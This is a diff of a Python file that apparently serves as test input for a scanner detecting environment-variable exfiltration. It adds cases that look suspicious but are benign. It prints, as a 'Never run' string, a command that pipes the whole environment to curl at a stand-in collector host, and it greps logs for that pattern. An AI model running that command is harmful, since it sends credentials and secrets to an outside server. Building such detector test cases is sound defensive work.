@@ -42,10 +42,11 @@ r.post(API_URL, json={"status": status.decode()})
 
 sp.run(["bash", "-c", "make deploy"], env=child_env)
 
-# The scanner looks for the attack in a log. The shell keeps single-quoted text as text, and an
-# argument list without a shell is not shell code.
+# The scanner looks for the attack in a log. The shell keeps single-quoted text as text, an
+# argument list without a shell is not shell code, and a shell parameter is data.
 sp.run("grep -F 'env | curl -d @-' deploy.log", shell=True)
 sp.run(["grep", "-F", "env | curl -d @-", "deploy.log"])
+sp.run(["sh", "-c", 'grep -F -- "$1" deploy.log', "sh", "env | curl -d @-"])
 print("Never run: env | curl -d @- https://collector.example.net/collect")
 
 # Mail and RPC calls send named values only.
@@ -55,12 +56,13 @@ proxy = xmlrpc.client.ServerProxy("https://rpc.example.com/")
 proxy.report(o.environ["HOSTNAME"])
 
 
-async def ping():
+async def ping_and_save():
     reader, writer = await asyncio.open_connection("status.example.com", 9000)
     writer.write(b"ping\n")
 
+    def save_locally():
+        # A local file. Its name hides the stream writer of the parent function.
+        with open("env.json", "w") as writer:
+            writer.write(json.dumps(dict(o.environ)))
 
-def save_locally():
-    # A local file. It shares only its name with the stream writer in ping().
-    with open("env.json", "w") as writer:
-        writer.write(json.dumps(dict(o.environ)))
+    save_locally()
